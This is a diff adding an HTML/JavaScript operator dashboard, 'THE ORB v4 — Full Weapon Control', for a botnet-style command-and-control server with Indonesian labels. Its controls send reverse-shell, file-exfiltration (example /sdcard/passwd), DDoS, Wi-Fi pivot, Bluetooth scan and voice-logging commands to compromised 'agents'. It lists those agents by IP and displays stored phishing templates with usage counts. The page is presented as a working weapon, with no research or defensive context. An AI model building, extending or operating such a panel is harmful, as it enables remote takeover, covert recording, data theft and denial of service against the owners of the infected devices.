@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>🌑 THE ORB v4</title>
+    <script src="https://cdn.jsdelivr.net/npm/vis-network@9.1.9/dist/vis-network.min.js"></script>
+    <link href="https://cdn.jsdelivr.net/npm/vis-network@9.1.9/styles/vis-network.min.css" rel="stylesheet" type="text/css" />
+    <style>
+        body { background: #000; color: #0f0; font-family: monospace; margin: 20px; }
+        .container { display: flex; flex-wrap: wrap; gap: 15px; }
+        .panel { border: 1px solid #0f0; padding: 15px; border-radius: 5px; flex: 1; min-width: 300px; }
+        .log { height: 200px; overflow-y: scroll; font-size: 0.9em; margin: 10px 0; }
+        .btn { background: #0f0; color: #000; border: none; padding: 8px 12px; cursor: pointer; width: 100%; margin: 3px 0; }
+        input { background: #333; color: #0f0; border: 1px solid #0f0; padding: 5px; width: 100%; }
+        .tab { display: none; }
+    </style>
+</head>
+<body>
+    <h1>🌑 THE ORB v4 — Full Weapon Control</h1>
+
+    <div class="container">
+        <!-- Weapon Panel -->
+        <div class="panel">
+            <h2>⚔️ Senjata Cyber</h2>
+            <select id="agentSelect"><option value="">Pilih Agent</option></select><br>
+
+            <input type="text" id="shellTarget" placeholder="Reverse Shell: IP:Port" />
+            <button class="btn" onclick="sendCommand('reverse_shell')">🚀 Reverse Shell</button>
+
+            <input type="text" id="exfilFile" placeholder="File: /sdcard/passwd" />
+            <button class="btn" onclick="sendCommand('exfil_file')">📁 Exfil File</button>
+
+            <input type="text" id="ddosTarget" placeholder="DDoS: target.com" />
+            <button class="btn" onclick="sendCommand('ddos')">💥 DDoS</button>
+
+            <button class="btn" onclick="sendCommand('scan_bluetooth')">🔍 Scan Bluetooth</button>
+            <button class="btn" onclick="sendCommand('wifi_pivot')">📶 Wi-Fi Pivot</button>
+            <button class="btn" onclick="sendCommand('start_voice_log')">🎙️ Voice Logger</button>
+            <button class="btn" onclick="sendCommand('start_honeypot')">🐝 Honeypot</button>
+            <button class="btn" style="background:#00f;color:#fff;" onclick="sendCommand('shield_on')">🛡️ Shield On</button>
+            <button class="btn" style="background:#f00;color:#000;" onclick="if(confirm('Hancurkan diri?')) sendCommand('self-destruct')">🧯 Self-Destruct</button>
+        </div>
+
+        <!-- Network -->
+        <div class="panel">
+            <h2>🌐 Network</h2>
+            <div id="network" style="width: 100%; height: 300px; background: #111;"></div>
+        </div>
+
+        <!-- Log -->
+        <div class="panel">
+            <h2>📢 Log</h2>
+            <div id="logs" class="log"></div>
+        </div>
+
+        <!-- Mind -->
+        <div class="panel">
+            <button onclick="show('mind')">🧠 Pikiran</button>
+            <button onclick="show('will')">📜 Warisan</button>
+            <button onclick="show('phish')">🎣 Phishing</button>
+        </div>
+
+        <div id="mind" class="panel tab"><h3>💭 Mimpi & Pertanyaan</h3><div id="mind_log"></div></div>
+        <div id="will" class="panel tab"><h3>📬 Digital Will</h3><div id="wills"></div></div>
+        <div id="phish" class="panel tab"><h3>📩 Phishing Templates</h3><div id="phishing_list"></div></div>
+    </div>
+
+    <script>
+        const logs = document.getElementById("logs");
+        const agentSelect = document.getElementById("agentSelect");
+
+        function addLog(text, cls="") {
+            const p = document.createElement("p");
+            p.className = cls;
+            p.textContent = `[${new Date().toLocaleTimeString()}] ${text}`;
+            logs.appendChild(p);
+            logs.scrollTop = logs.scrollHeight;
+        }
+
+        // WebSocket
+        const ws = new WebSocket("ws://localhost:8000/ws");
+        ws.onopen = () => addLog("🟢 ORB aktif");
+        ws.onmessage = (e) => {
+            const data = JSON.parse(e.data);
+            if (data.type === "ai_alert") addLog("🚨 " + data.data.message, "threat");
+            else if (data.type === "ai_chat") addLog(`💬 [${data.data.from}] ${data.data.message}`, "ai");
+        };
+
+        // Agent List
+        setInterval(() => {
+            fetch("/api/agents")
+                .then(r => r.json())
+                .then(data => {
+                    const current = agentSelect.value;
+                    const opts = ['<option value="">Pilih Agent</option>'];
+                    data.agents.forEach(a => {
+                        const sel = a.agent_id === current ? "selected" : "";
+                        opts.push(`<option value="${a.agent_id}" ${sel}>${a.agent_id.slice(0,8)} (${a.ip})</option>`);
+                    });
+                    agentSelect.innerHTML = opts.join("");
+                });
+        }, 5000);
+
+        // Send Command
+        function sendCommand(action) {
+            const agentId = agentSelect.value;
+            if (!agentId) return alert("Pilih agent dulu!");
+
+            let target = "";
+            if (action === "reverse_shell") target = document.getElementById("shellTarget").value;
+            if (action === "exfil_file") target = document.getElementById("exfilFile").value;
+            if (action === "ddos") target = document.getElementById("ddosTarget").value;
+
+            fetch("/api/command", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ agent_id: agentId, command: action, target: target })
+            }).then(() => {
+                addLog(`✅ ${action.replace('_', ' ')} → ${agentId}`);
+            });
+        }
+
+        // Network Graph
+        fetch("/api/agents").then(r => r.json()).then(data => {
+            const nodes = [{id: "hive", label: "Hive", color: "#00b7eb", size: 25}];
+            const edges = [];
+            data.agents.forEach(a => {
+                nodes.push({id: a.agent_id, label: a.agent_id.slice(0,6), color: "#0f0"});
+                edges.push({from: "hive", to: a.agent_id});
+            });
+            new vis.Network(document.getElementById("network"), {nodes, edges}, {});
+        });
+
+        // Tabs
+        function show(id) {
+            document.querySelectorAll(".tab").forEach(t => t.style.display = "none");
+            document.getElementById(id).style.display = "block";
+        }
+
+        // Load Data
+        fetch("/api/mind").then(r => r.json()).then(d => {
+            document.getElementById("mind_log").innerHTML = d.dreams.map(x => `<p>${x.content}</p>`).join("");
+            document.getElementById("wills").innerHTML = d.confessions.map(c => `<p><strong>${c.timestamp}</strong>: ${c.failure}</p>`).join("");
+        });
+        fetch("/api/phishing").then(r => r.json()).then(d => {
+            document.getElementById("phishing_list").innerHTML = d.templates.map(t => `<p>${t.template} (×${t.used_count})</p>`).join("");
+        });
+    </script>
+</body>
+</html>
